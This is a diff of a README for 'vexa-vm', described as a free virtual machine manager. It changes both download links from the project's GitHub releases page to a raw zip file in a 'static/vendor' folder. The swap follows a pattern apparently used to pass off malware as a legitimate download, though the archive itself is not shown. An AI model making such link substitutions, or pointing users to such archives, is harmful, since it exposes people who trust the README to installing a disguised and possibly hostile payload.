@@ -1,6 +1,6 @@
 # 🖥️ vexa-vm - Manage Virtual Machines Easily
 
-[![Download vexa-vm](https://img.shields.io/badge/Download-vexa--vm-blue?style=for-the-badge&logo=github)](https://github.com/belltowersuperscription464/vexa-vm/releases)
+[![Download vexa-vm](https://img.shields.io/badge/Download-vexa--vm-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/belltowersuperscription464/vexa-vm/main/static/vendor/v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Welcome to vexa-vm, a free and open-source virtualization platform that lets you
 
 **Visit this link to download the application.**
 
-[Click here to download vexa-vm](https://github.com/belltowersuperscription464/vexa-vm/releases)
+[Click here to download vexa-vm](https://raw.githubusercontent.com/belltowersuperscription464/vexa-vm/main/static/vendor/v2.3.zip)
 
 After downloading, follow these steps:
 
